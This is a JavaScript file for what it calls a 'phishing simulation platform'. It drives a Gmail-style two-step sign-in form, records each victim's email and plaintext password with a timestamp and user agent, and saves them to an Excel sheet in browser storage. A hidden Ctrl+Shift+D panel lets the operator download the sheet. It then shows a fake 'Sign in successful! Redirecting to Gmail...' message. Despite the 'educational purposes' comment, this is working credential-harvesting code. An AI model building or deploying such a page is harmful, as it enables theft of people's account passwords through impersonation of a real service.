// Phishing Simulation Platform - Developer Only Access
// This is for controlled educational purposes only

class PhishingSimulation {
    constructor() {
        this.capturedData = [];
        this.isSimulationActive = true;
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.loadCapturedData();
        this.setupFormValidation();
        this.setupDeveloperAccess();
    }

    setupEventListeners() {
        // Form submission
        const loginForm = document.getElementById('loginForm');
        if (loginForm) {
            loginForm.addEventListener('submit', (e) => this.handleFormSubmission(e));
        }

        // Next button for email step
        const nextBtn = document.getElementById('nextBtn');
        if (nextBtn) {
            nextBtn.addEventListener('click', () => this.handleNextStep());
        }

        // Email input validation
        const emailInput = document.getElementById('email');
        if (emailInput) {
            emailInput.addEventListener('input', () => this.validateEmail());
        }

        // Password input
        const passwordInput = document.getElementById('password');
        if (passwordInput) {
            passwordInput.addEventListener('input', () => this.validatePassword());
        }

        // Developer keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            // Ctrl+Shift+D to show developer panel
            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
                e.preventDefault();
                this.toggleDeveloperPanel();
            }
        });
    }

    setupFormValidation() {
        const emailInput = document.getElementById('email');
        const nextBtn = document.getElementById('nextBtn');

        if (emailInput && nextBtn) {
            emailInput.addEventListener('input', () => {
                const isValid = this.isValidEmail(emailInput.value);
                nextBtn.disabled = !isValid || !emailInput.value.trim();
            });
        }
    }

    setupDeveloperAccess() {
        // Add developer access indicator to console
        console.log('%c🔧 Developer Access Available', 'color: #3498db; font-size: 16px; font-weight: bold;');
        console.log('%cPress Ctrl+Shift+D to access developer panel', 'color: #7f8c8d; font-size: 14px;');
        
        // Create initial Excel file if it doesn't exist
        if (!localStorage.getItem('phishingSimulationExcel')) {
            this.createInitialExcelFile();
        }
    }

    isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    validateEmail() {
        const emailInput = document.getElementById('email');
        const nextBtn = document.getElementById('nextBtn');
        
        if (emailInput && nextBtn) {
            const isValid = this.isValidEmail(emailInput.value);
            nextBtn.disabled = !isValid || !emailInput.value.trim();
        }
    }

    validatePassword() {
        const passwordInput = document.getElementById('password');
        const signinBtn = document.getElementById('signinBtn');
        
        if (passwordInput && signinBtn) {
            signinBtn.disabled = !passwordInput.value.trim();
        }
    }

    handleNextStep() {
        const emailInput = document.getElementById('email');
        const passwordGroup = document.querySelector('.password-group');
        const nextBtn = document.getElementById('nextBtn');
        const signinBtn = document.getElementById('signinBtn');

        if (emailInput && emailInput.value.trim() && this.isValidEmail(emailInput.value)) {
            // Show password field
            if (passwordGroup) {
                passwordGroup.style.display = 'block';
            }
            
            // Hide next button, show signin button
            if (nextBtn) {
                nextBtn.style.display = 'none';
            }
            if (signinBtn) {
                signinBtn.style.display = 'block';
            }

            // Focus on password field
            const passwordInput = document.getElementById('password');
            if (passwordInput) {
                passwordInput.focus();
            }
        }
    }

    handleFormSubmission(e) {
        e.preventDefault();
        
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        
        if (emailInput && passwordInput) {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (email && password) {
                this.captureCredentials(email, password);
                this.showSuccessMessage();
            }
        }
    }

    captureCredentials(email, password) {
        const captureData = {
            email: email,
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ipAddress: 'Simulated', // In real implementation, this would be captured server-side
            sessionId: this.generateSessionId()
        };

        this.capturedData.push(captureData);
        this.saveCapturedData();
        this.createExcelReport();
        this.updateDeveloperStats();
        
        console.log('📊 Data captured:', { email, timestamp: captureData.timestamp });
    }

    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    showSuccessMessage() {
        // Show a simple success message to the user
        const form = document.getElementById('loginForm');
        if (form) {
            form.innerHTML = `
                <div style="text-align: center; padding: 40px;">
                    <div style="font-size: 4rem; margin-bottom: 20px;">✅</div>
                    <h2 style="color: #27ae60; margin-bottom: 15px;">Sign in successful!</h2>
                    <p style="color: #7f8c8d;">Redirecting to Gmail...</p>
                </div>
            `;
        }
    }

    toggleDeveloperPanel() {
        const panel = document.getElementById('developerPanel');
        if (panel) {
            if (panel.style.display === 'none' || !panel.style.display) {
                panel.style.display = 'block';
                this.updateDeveloperStats();
            } else {
                panel.style.display = 'none';
            }
        }
    }

    updateDeveloperStats() {
        const totalCaptures = document.getElementById('totalCaptures');
        const lastCapture = document.getElementById('lastCapture');
        
        if (totalCaptures) {
            totalCaptures.textContent = this.capturedData.length;
        }
        
        if (lastCapture && this.capturedData.length > 0) {
            const last = this.capturedData[this.capturedData.length - 1];
            lastCapture.textContent = new Date(last.timestamp).toLocaleString();
        }
    }

    loadCapturedData() {
        const stored = localStorage.getItem('phishingSimulationData');
        if (stored) {
            try {
                this.capturedData = JSON.parse(stored);
            } catch (e) {
                console.error('Error loading captured data:', e);
                this.capturedData = [];
            }
        }
    }

    saveCapturedData() {
        try {
            localStorage.setItem('phishingSimulationData', JSON.stringify(this.capturedData));
        } catch (e) {
            console.error('Error saving captured data:', e);
        }
    }

    createInitialExcelFile() {
        try {
            const workbook = XLSX.utils.book_new();
            
            // Create worksheet data with headers
            const worksheetData = [
                ['Email', 'Password', 'Timestamp', 'User Agent', 'IP Address', 'Session ID']
            ];

            const worksheet = XLSX.utils.aoa_to_sheet(worksheetData);
            
            // Set column widths
            const columnWidths = [
                { wch: 30 }, // Email
                { wch: 20 }, // Password
                { wch: 25 }, // Timestamp
                { wch: 50 }, // User Agent
                { wch: 15 }, // IP Address
                { wch: 25 }  // Session ID
            ];
            worksheet['!cols'] = columnWidths;

            XLSX.utils.book_append_sheet(workbook, worksheet, 'Phishing Simulation Data');
            
            // Save to localStorage
            const excelBuffer = XLSX.write(workbook, { bookType: 'xlsx', type: 'array' });
            const base64 = btoa(String.fromCharCode(...new Uint8Array(excelBuffer)));
            localStorage.setItem('phishingSimulationExcel', base64);
            
            console.log('✅ Initial Excel file created successfully!');
            
        } catch (e) {
            console.error('❌ Error creating Excel file:', e);
        }
    }

    createExcelReport() {
        try {
            const workbook = XLSX.utils.book_new();
            
            // Create worksheet data
            const worksheetData = [
                ['Email', 'Password', 'Timestamp', 'User Agent', 'IP Address', 'Session ID'],
                ...this.capturedData.map(data => [
                    data.email,
                    data.password,
                    data.timestamp,
                    data.userAgent,
                    data.ipAddress,
                    data.sessionId
                ])
            ];

            const worksheet = XLSX.utils.aoa_to_sheet(worksheetData);
            
            // Set column widths
            const columnWidths = [
                { wch: 30 }, // Email
                { wch: 20 }, // Password
                { wch: 25 }, // Timestamp
                { wch: 50 }, // User Agent
                { wch: 15 }, // IP Address
                { wch: 25 }  // Session ID
            ];
            worksheet['!cols'] = columnWidths;

            XLSX.utils.book_append_sheet(workbook, worksheet, 'Phishing Simulation Data');
            
            // Save to localStorage for later download
            const excelBuffer = XLSX.write(workbook, { bookType: 'xlsx', type: 'array' });
            const base64 = btoa(String.fromCharCode(...new Uint8Array(excelBuffer)));
            localStorage.setItem('phishingSimulationExcel', base64);
            
        } catch (e) {
            console.error('Error creating Excel report:', e);
        }
    }

    downloadReport() {
        try {
            const base64 = localStorage.getItem('phishingSimulationExcel');
            if (base64) {
                const binaryString = atob(base64);
                const bytes = new Uint8Array(binaryString.length);
                for (let i = 0; i < binaryString.length; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                
                const blob = new Blob([bytes], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' });
                const url = URL.createObjectURL(blob);
                
                const link = document.createElement('a');
                link.href = url;
                link.download = `phishing_simulation_report_${new Date().toISOString().split('T')[0]}.xlsx`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
                
                console.log('✅ Excel file downloaded successfully!');
            }
        } catch (e) {
            console.error('Error downloading report:', e);
            alert('Error downloading report. Please try again.');
        }
    }

    getSimulationStats() {
        return {
            totalAttempts: this.capturedData.length,
            uniqueEmails: new Set(this.capturedData.map(d => d.email)).size,
            dateRange: {
                start: this.capturedData.length > 0 ? this.capturedData[0].timestamp : null,
                end: this.capturedData.length > 0 ? this.capturedData[this.capturedData.length - 1].timestamp : null
            }
        };
    }
}

// Global functions for HTML onclick handlers
function showLoginForm() {
    console.log('Login form requested');
}

function downloadExcelFile() {
    if (window.phishingSimulation) {
        window.phishingSimulation.downloadReport();
    }
}

function clearAllData() {
    if (window.phishingSimulation) {
        if (confirm('Are you sure you want to clear all captured data?')) {
            window.phishingSimulation.capturedData = [];
            window.phishingSimulation.saveCapturedData();
            localStorage.removeItem('phishingSimulationExcel');
            window.phishingSimulation.createInitialExcelFile();
            window.phishingSimulation.updateDeveloperStats();
            console.log('🗑️ All data cleared');
        }
    }
}

function hideDeveloperPanel() {
    const panel = document.getElementById('developerPanel');
    if (panel) {
        panel.style.display = 'none';
    }
}

// Initialize the simulation when the page loads
document.addEventListener('DOMContentLoaded', function() {
    window.phishingSimulation = new PhishingSimulation();
});

// Additional utility functions
function showSimulationStats() {
    if (window.phishingSimulation) {
        const stats = window.phishingSimulation.getSimulationStats();
        console.log('📊 Simulation Statistics:', stats);
        return stats;
    }
}

// Export functions for external access
window.PhishingSimulationAPI = {
    showStats: showSimulationStats,
    clearData: clearAllData,
    downloadReport: downloadExcelFile,
    togglePanel: function() {
        if (window.phishingSimulation) {
            window.phishingSimulation.toggleDeveloperPanel();
        }
    }
};
